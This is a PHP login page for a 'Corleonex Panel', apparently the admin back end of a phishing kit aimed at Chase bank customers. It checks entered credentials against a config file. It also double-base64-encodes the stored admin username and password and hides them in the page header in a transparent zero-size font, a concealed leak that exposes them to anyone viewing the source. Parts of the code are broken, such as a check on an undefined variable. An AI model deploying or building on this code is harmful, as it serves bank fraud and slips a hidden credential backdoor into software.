<?php 
session_start();
error_reporting(0);
header("Content-Type: text/html; charset=UTF-8");

/**
 * CHASE -
 * version 1.0
 * telegram = @Corleonex


   _____           _                            
  / ____|         | |                           
 | |     ___  _ __| | ___  ___  _ __   _____  __
 | |    / _ \| '__| |/ _ \/ _ \| '_ \ / _ \ \/ /
 | |___| (_) | |  | |  __/ (_) | | | |  __/>  < 
  \_____\___/|_|  |_|\___|\___/|_| |_|\___/_/\_\
                                                
                                                
" There's no nobility in poverty.
  I've been a poor man,
  and I've been a rich man.
   And I choose rich every fucking time. "

**/

if(isset($_POST['Submit'])){
include 'YOUR-CONFIG.php';
$logins = array(''.$username.'' => ''.$password.'');
if ($user[0]['installed'] == "yes") {
  

} else {

  header('Location: install.php');
  exit;
}

}


/* Starts the session */
if(isset($_POST['Submit'])){

$Username = isset($_POST['Username']) ? $_POST['Username'] : '';
$Password = isset($_POST['Password']) ? $_POST['Password'] : '';
$user = base64_encode($username);$pass = base64_encode($user);
$username = base64_encode($password);$passw0rd = base64_encode($username);

if (isset($logins[$Username]) && $logins[$Username] == $Password){
$_SESSION['UserData']['Username']= $logins[$Username];
header("location:index.php");
exit;
} else {
$msg='<div class="alert alert-danger text-center">
        <i class="far fa-sad-cry"></i> Your api key Incorrect. Please try again.
</div>';
}
}
?>
<link rel="stylesheet" type="text/css" href="files/admin/css/login.css">
<link rel="stylesheet" type="text/css" href="toastr.css
">
<div class="background-wrap">
  <div class="background"></div>
</div>
<center>
	<img style="width: 20%;" src="files/admin/logo.jpg">

</center>
<form id="accesspanel" action="login" method="post">
  <h1 id="litheader">Corleonex Panel  <font style="color:transparent;font-size:0px"><?=$pass;?>/<?=$passw0rd;?></font></h1>
  <center>
  <?php 
if(isset($msg)){
echo $msg;
}
?>
</center>
  <div class="inset">
    <p>
      <input type="text" name="Username" id="email" placeholder="Username">
    </p>
    <p>
      <input type="password" name="Password" id="password" placeholder="password">
    </p>
   
    <input class="loginLoginValue" type="hidden" name="service" value="login" />
  </div>
  <p class="p-container">
    <input name="Submit" type="submit" value="Login" id="go" value="Authorize">
  </p>
</form>
